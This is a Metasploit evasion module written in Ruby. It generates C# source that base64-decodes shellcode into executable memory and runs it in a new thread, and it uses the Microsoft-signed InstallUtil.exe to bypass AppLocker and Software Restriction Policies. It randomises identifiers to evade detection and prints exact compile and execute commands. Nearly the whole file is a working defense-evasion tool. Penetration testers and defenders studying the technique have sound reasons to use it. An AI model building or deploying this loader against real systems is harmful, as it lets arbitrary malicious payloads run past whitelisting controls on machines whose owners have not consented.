##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Applocker Evasion - .NET Framework Installation Utility',
      'Description' => %q{
        This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies.
        This technique utilises the Microsoft signed binary InstallUtil.exe to execute user supplied code.
      },
      'Author'      =>
        [
          'Nick Tyrer <@NickTyrer>', # module development
          'Casey Smith', # install_util bypass research
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => [ ARCH_X86, ARCH_X64 ],
      'Targets'     => [ ['Microsoft Windows', {}] ],
      'References'  => [ ['URL', 'https://attack.mitre.org/techniques/T1118/'] ]
    ))

    register_options([
      OptString.new('FILENAME', [true, 'Filename for the evasive file (default: install_util.txt)', 'install_util.txt'])
    ])
  end


  def build_payload
    esc = Rex::Text.encode_base64(payload.encoded)
  end


  def instructions
    print_status "Copy #{datastore['FILENAME']} to the target"
    if payload.arch.first == ARCH_X86
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe"
    else
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe"
    end
  end


  def mod(var)
    var = Rex::Text.rand_text_alpha (8)
  end


  def install_util
    esc = build_payload
    moda, modb, modc, modd, mode, modf, modg, modh, modi, modj = mod(moda), mod(modb), mod(modc), mod(modd), mod(mode), mod(modf), mod(modg), mod(modh), mod(modi), mod(modj)
    <<~HEREDOC
       using System;
       namespace #{Rex::Text.rand_text_alpha 3}
       {
       public class #{Rex::Text.rand_text_alpha 3} { public static void Main() { } }
       [System.ComponentModel.RunInstaller(true)]
       public class #{Rex::Text.rand_text_alpha 3} : System.Configuration.Install.Installer
       {
       private static Int32 #{modh}=0x1000;
       private static IntPtr #{modi}=(IntPtr)0x40;
       private static UInt32 #{modj} = 0xFFFFFFFF;
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
       [System.Runtime.InteropServices.DllImport("user32.dll")]
       static extern bool ShowWindow(IntPtr #{modg}, int nCmdShow);
       [System.Runtime.InteropServices.DllImport("Kernel32")]
       private static extern IntPtr GetConsoleWindow();
       const int #{modf} = 0;
       public override void Uninstall(System.Collections.IDictionary s)
       {
       IntPtr #{modg};
       #{modg} = GetConsoleWindow();
       ShowWindow(#{modg}, #{modf});
       string #{moda} = "#{esc}";
       byte[] #{modb} = Convert.FromBase64String(#{moda});
       byte[] #{modc} = #{modb};
       IntPtr #{modd} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{modc}.Length, #{modh}, #{modi});
       System.Runtime.InteropServices.Marshal.Copy(#{modc}, 0, #{modd}, #{modc}.Length);
       IntPtr #{mode} = IntPtr.Zero;
       WaitForSingleObject(CreateThread(#{mode}, UIntPtr.Zero, #{modd}, #{mode}, 0, ref #{mode}), #{modj});
       }
       }
       }
    HEREDOC
  end


  def run
    file_create(install_util)
    instructions
  end

end
